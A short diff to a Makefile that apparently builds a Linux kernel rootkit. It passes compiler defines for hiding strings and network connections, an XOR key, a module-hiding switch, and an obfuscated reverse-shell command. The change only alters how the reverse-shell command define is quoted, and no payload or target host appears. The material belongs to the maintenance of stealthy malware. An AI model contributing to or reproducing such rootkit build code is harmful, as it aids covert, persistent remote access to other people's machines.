@@ -43,7 +43,7 @@ EXTRA_CFLAGS += -I$(PWD)/include \
                 -DMODULE_NAME=\"$(MODULE_NAME)\" \
                 -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
                 -DNET_EXCLUDES=\"$(NET_EXCLUDES)\" \
-				-DRSHELL_CMD_OBF=\"$(DRSHELL_CMD_OBF)\" \
+				-DRSHELL_CMD_OBF="{ $(DRSHELL_CMD_OBF) }" \
 				-DXOR_KEY=$(XOR_KEY)
 
 ifeq ($(HIDE_MODULE),1)
